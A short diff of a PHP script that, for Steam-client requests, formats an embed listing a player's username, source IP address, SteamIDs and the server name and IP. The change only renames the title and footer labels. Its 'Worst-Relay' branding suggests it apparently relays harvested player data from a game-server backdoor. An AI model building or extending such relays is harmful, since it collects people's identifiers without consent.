@@ -71,12 +71,12 @@ if ($_SERVER['HTTP_USER_AGENT'] == "Valve/Steam HTTP Client 1.0 (4000)")
     $json_data = json_encode([
         "embeds" => [
             [
-                "title" => "W0RST-PROJECT",
+                "title" => "",
                 "color" => hexdec("#86ffba"),
                 "timestamp" => date("c", strtotime("now")),
-                "description" => "```$Response\nUsername: $username\nSourceAddr: $source\nIgnName: $steamname\nSteamID: $steamid\nSteam64: $steam64\nServer: $server_name\nServerIp: $server_ip```",
+                "description" => "```$Response\nUsername: $username\nSourceAddr: $source\nIgnName: $steamname\nSteamID: $steamid\nSteamID64: $steam64\nServer: $server_name\nServerIp: $server_ip```",
                 "footer" => [
-                    "text" => "Relay",
+                    "text" => "Worst-Relay",
                 ]
             ]
         ]
